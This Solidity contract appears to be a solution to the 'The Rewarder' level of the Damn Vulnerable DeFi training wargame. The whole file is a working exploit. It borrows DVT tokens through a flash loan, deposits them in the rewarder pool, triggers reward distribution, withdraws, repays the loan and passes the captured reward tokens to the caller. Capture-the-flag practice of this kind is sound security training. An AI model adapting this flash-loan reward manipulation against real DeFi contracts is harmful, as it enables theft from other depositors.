// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title TheRewarderPool
 * @author zishansami102

 */
contract AttackTheRewarderPool {

    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public dvt;
    FlashLoanerPool public flashLoan;

    constructor(address _rewarderPool, address _rewardToken, address _dvt, address _flashLoan) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
        dvt = DamnValuableToken(_dvt);
        flashLoan = FlashLoanerPool(_flashLoan);
    }

    function attack(uint256 loanAmount) external {
        flashLoan.flashLoan(loanAmount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amountRecieved) external {
        dvt.approve(address(rewarderPool), amountRecieved);
        rewarderPool.deposit(amountRecieved);
        rewarderPool.withdraw(amountRecieved);
        rewarderPool.distributeRewards();
        dvt.transfer(address(flashLoan), amountRecieved);
    }
}
